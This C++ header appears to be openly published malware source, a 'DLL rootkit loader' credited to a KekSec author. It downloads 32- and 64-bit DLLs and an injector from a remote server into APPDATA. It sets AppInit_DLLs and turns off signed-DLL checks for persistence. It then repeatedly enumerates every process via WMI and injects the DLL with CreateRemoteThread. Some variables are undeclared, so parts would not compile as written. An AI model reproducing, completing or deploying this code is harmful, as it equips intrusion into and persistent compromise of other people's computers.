//dont skid this leave credit - CODED BY FREAK - http://pastebin.com/u/KekSec - https://github.com/freakanonymous
//please star me on github :D
//copyright??? - Freak 01/25/2021
// hope this one works.
#pragma once
#ifndef NO_ROOTKIT
#ifndef __RKIT_LOADED
#define __RKIT_LOADED
#include <Windows.h>
#define _WIN32_DCOM
#include <iostream>
using namespace std;
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib") //WMI
#include <atlbase.h>
#include <atlstr.h>
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <fstream>
#include <dbghelp.h>
#include <fstream>
#pragma comment(lib, "ntdll.lib") //for RtlAdjustPrivilege in heavens gate test
#define SE_DEBUG_PRIVILEGE 20
extern "C" NTSYSAPI NTSTATUS WINAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY START*//**//**//**//**//**//**//**//**//**//**//**//**/
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY START*//**//**//**//**//**//**//**//**//**//**//**//**/
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY START*//**//**//**//**//**//**//**//**//**//**//**//**/
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////








char x64injectpath[MAX_PATH + 1];
char* dllhide = "$6829";
char* mutexseparator = ":";
bool IsInjected(DWORD pid)
{
    CHAR Mutant[64];
    sprintf(Mutant, "%d%s%s", pid, mutexseparator, dllhide);
    HANDLE hMu = OpenMutexA(MAXIMUM_ALLOWED, 0, Mutant);
    if (!hMu)
        return 0;
    CloseHandle(hMu);

    return 1;
}
BOOL isrunning64 = FALSE;


void inject(DWORD dwProcessId, char* dllpath32, char* dllpath64, BOOL isrunning64) {
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, false, dwProcessId);
    BOOL is64 = FALSE;
    if (h)
    {
        if (isrunning64) {
            if (IsWow64Process(h, &is64)) {
                SHELLEXECUTEINFO ShExecInfo;
                ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
                ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
                ShExecInfo.hwnd = NULL;
                ShExecInfo.lpVerb = NULL;
                ShExecInfo.lpFile = x64injectpath;
                char runinject[MAX_PATH * 2 + 10];
                sprintf(runinject, "-t 3 %d \"%s\"", dwProcessId, dllpath64);
                ShExecInfo.lpParameters = runinject;
                ShExecInfo.lpDirectory = NULL;
                ShExecInfo.nShow = SW_HIDE;
                ShExecInfo.hInstApp = NULL;
                ShellExecuteEx(&ShExecInfo);
                WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
                return;
            }
        }
        
        PVOID LoadLibAddr = (PVOID)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA");
        LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllpath32), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        WriteProcessMemory(h, dereercomp, dllpath32, strlen(dllpath32), NULL);
        HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
        
    }
}
class WMITask
{
protected:

    void WMIConnect(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid);
    int WMIGetUserProcesses(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid);

    //////////////////////////////////////////////////////
    //////////////////WMI Structs/////////////////////////
    CComPtr< IWbemLocator > locator;
    CComPtr< IWbemServices > service;
    CComPtr< IEnumWbemClassObject > enumerator;

    CComPtr< IWbemClassObject > object;

    HRESULT WMIHandle;
    ///////////////////////////////////////////////////////

public:

    //////////////////////////////////////////////////////
    /////////////////WMI Vaiables/////////////////////////

    // WMI Vars : Process
    CString sUserProcesses;

    DWORD mypid;
    ///////////////////////////////////////////////////////

    WMITask(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid);



};

// Contructor
//__________________________________________________________________________________
WMITask::WMITask(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid)
{
    WMIConnect(dllpath32, dllpath64, isrunning64, mypid);
}
// WMI Handler
//_____________________________________________________________________________
void WMITask::WMIConnect(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid)
{
    // http://msdn.microsoft.com/en-us/library/aa389273(v=VS.85).aspx

    int result = 0;
    WMIHandle = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // setup process-wide security context
    WMIHandle = CoInitializeSecurity(NULL,	// we're not a server
        -1,			// we're not a server
        NULL,		// we're not a server
        NULL,		// reserved
        RPC_C_AUTHN_LEVEL_DEFAULT, // let DCOM decide
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL);

    // we're going to use CComPtr<>s, whose lifetime must end BEFORE CoUnitialize is called
    // connect to WMI
    WMIHandle = CoCreateInstance(CLSID_WbemAdministrativeLocator, NULL,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, reinterpret_cast<void**>(&locator));

    if (FAILED(WMIHandle))
    {
        // Instantiation of IWbemLocator failed

        CoUninitialize();
        return;
    }

    // connect to local service with current credentials
    WMIHandle = locator->ConnectServer(L"root\\cimv2", NULL, NULL, NULL,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT,
        NULL, NULL, &service);

    if (SUCCEEDED(WMIHandle))
    {
        WMIGetUserProcesses(dllpath32, dllpath64, isrunning64, mypid);

    }
    else {
        // Couldn't connect to service
    }
    CoUninitialize();
}


int WMITask::WMIGetUserProcesses(char* dllpath32, char* dllpath64,  BOOL isrunning64, DWORD mypid)

{
    /////////////////////////////////////////////////////////////////////////////////////////
    // Var's & Class Declerations
    //

    int statusreturn = 0;
    ULONG retcnt;
    _bstr_t str;
    _bstr_t STR;
    _variant_t var_val;
    _variant_t pVal;

    CString Caption;
    CString ProcessId;
    CString ProcessStr;
    CString User;

    IWbemClassObject* pClass;
    IWbemClassObject* pwcrGetOwnerIn = NULL;
    IWbemClassObject* pwcrGetOwnerOut = NULL;
    IWbemClassObject* pOutParams = NULL;

    /////////////////////////////////////////////////////////////////////////////////////////
    // Execute
    //

    // Execute Service Query
    // --------------------------------------------------
    WMIHandle = service->ExecQuery(L"WQL", L"SELECT ProcessId FROM Win32_Process",
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &enumerator);
    // --------------------------------------------------
    if (SUCCEEDED(WMIHandle))		// - Check Query Result
    {
        // --------------------------------------------------
        for (;;) {						// - Endless Loop, Must break manually
        // --------------------------------------------------
            WMIHandle = enumerator->Next(WBEM_INFINITE, 1L, reinterpret_cast<IWbemClassObject**>(&object), &retcnt);
            // --------------------------------------------------
            if (SUCCEEDED(WMIHandle))	// - Check Query Result
            {
                if (retcnt > 0)			// - Check if anymore object vars are avalible

                {
                    WMIHandle = object->Get(L"ProcessId", 0, &var_val, NULL, NULL);
                    int dwProcessId = var_val.intVal;
                    if (!IsInjected(dwProcessId) && dwProcessId != mypid && dwProcessId != 0) {
                        inject(dwProcessId, dllpath32, dllpath64, isrunning64);
                    }

                }
                else {
                    statusreturn = -3; break; // Enumeration empty(emptied)
                }
            }
            else {
                statusreturn = -2; // Error in iterating through enumeration
            }
        }
    }
    else {
        statusreturn = -1; // Bad ExecQuery
    }

    // Release Memory
    // --------------------------------------------------


    // Release Memory
    // --------------------------------------------------
    VariantClear(&var_val);
    VariantClear(&pVal);
    pClass->Release();
    pwcrGetOwnerOut->Release();
    pOutParams->Release();
    object.Release();

    Caption.ReleaseBuffer();
    ProcessId.ReleaseBuffer();
    ProcessStr.ReleaseBuffer();
    User.ReleaseBuffer();

    return statusreturn;
}
#pragma comment(lib, "urlmon.lib")

void DownloadFile(char* url, char* dest) {

	HINTERNET hInet;
	hInet = InternetOpenA("wininet", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInet) return;
	HANDLE fh, f;
	
	fh = InternetOpenUrl(ih, url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			return;
		}
		char fbuff[512];
		DWORD r = 0, d = 0;
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
		} while (r > 0);
		CloseHandle(f);
	}
}/*
char *getFileContent(char * pathname) {
	ifstream hexa;
	hexa.open(pathname);
	int size = hexa.tellg();
	char* hexarray =(char*)malloc(size);

	while (!hexa.eof())
	{
		for (int i = 0; i <= size; i++)
		{

			hexarray[i] = hexa.get();
		}
	}



	hexa.close();
	return hexarray;
}*/
DWORD WINAPI rootkit(LPARAM none) {


	int err = 0;
	WSADATA WSAdata;
	if ((err = WSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2) {
		WSACleanup();
		return 0;
	}
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;

	HKEY hKey;
	long result = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		(LPCSTR)"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
		0,
		KEY_WRITE,
		&hKey
	);
    char dllinstallpath32[MAX_PATH + 1];
    char dllinstallpath64[MAX_PATH + 1];
    char exeinstallpath[MAX_PATH + 1];
    sprintf_s(dllinstallpath32, "%s\\%s\\%s_32.dll", std::getenv("APPDATA"), dllhide, dllhide);
	sprintf_s(dllinstallpath64, "%s\\%s\\%s_64.dll", std::getenv("APPDATA"), dllhide, dllhide);
    sprintf_s(exeinstallpath, "%s\\%s\\%s_.exe", std::getenv("APPDATA"), dllhide, dllhide);
	struct stat buffer;
	char url32[512] = { 0 };
    sprintf_s(url32, "http://%s/x86.dll", dllserver);
    if (stat(dllinstallpath32, &buffer) != 0) {
        DownloadFile(url32, dllinstallpath32);
        if (stat(dllinstallpath32, &buffer) != 0) return 2;
    }
    BOOL f64 = FALSE;
    isrunning64 = IsWow64Process(GetCurrentProcess(), &f64) && f64;
	char url64[512] = { 0 };
	char x64injectpathurl[512] = { 0 };
    if (isrunning64) {
        sprintf_s(dllinstallpath64, "%s\\%s\\%s_64.dll", std::getenv("APPDATA"), dllhide, dllhide);
        sprintf_s(x64injectpath, "%s\\%s\\%s_64i.exe", std::getenv("APPDATA"), dllhide, dllhide);
        sprintf_s(url64, "http://%s/x64.dll", dllserver);
        sprintf_s(x64injectpathurl, "http://%s/x64i.exe", dllserver);
		if (stat(dllinstallpath64, &buffer) != 0) {
			DownloadFile(url64, dllinstallpath64);
			if (stat(dllinstallpath64, &buffer) != 0) return 2;
		}
		if (stat(x64injectpath, &buffer) != 0) {
			sprintf_s(x64injectpathurl, "http://%s/x64i.exe", dllserver);
			DownloadFile(x64injectpathurl, x64injectpath);
			if (stat(x64injectpath, &buffer) != 0) return 3;
		}
    }

    if (result == ERROR_SUCCESS) {
            DWORD value0 = 0;
            DWORD value1 = 1;

            if (!isrunning64) {
                RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath32, (strlen(dllinstallpath32) + 1) * sizeof(char));
            }
            else {
                RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath64, (strlen(dllinstallpath64) + 1) * sizeof(char));
            }
            RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD, (BYTE*)value0, sizeof(DWORD));
            RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)value1, sizeof(DWORD));
            RegCloseKey(hKey);
    }
    
	// check if the library has a ReflectiveLoader...
	//char *lpBuff = getFileContent(dllinstallpath
    DWORD mypid = GetCurrentProcessId(); //mypid is used for making sure we dont hook our own process
	while (1) {
        //DWORD activePID;
        //HWND activeWnd = GetActiveWindow();
       // GetWindowThreadProcessId(activeWnd, &activePID);
       // if(activePID != mypid) inject(activePID, dllinstallpath32, dllinstallpath64, isrunning64);
        WMITask(dllinstallpath32, dllinstallpath64, isrunning64, mypid);
        Sleep(150);
	}
}
#endif
#endif

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY END*//**//**//**//**//**//**//**//**//**//**//**//**///
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY END*//**//**//**//**//**//**//**//**//**//**//**//**///
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//**//**//**//**//**//**//**//**//*DLL_ROOTKIT_loader LIBRARY END*//**//**//**//**//**//**//**//**//**//**//**//**///
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
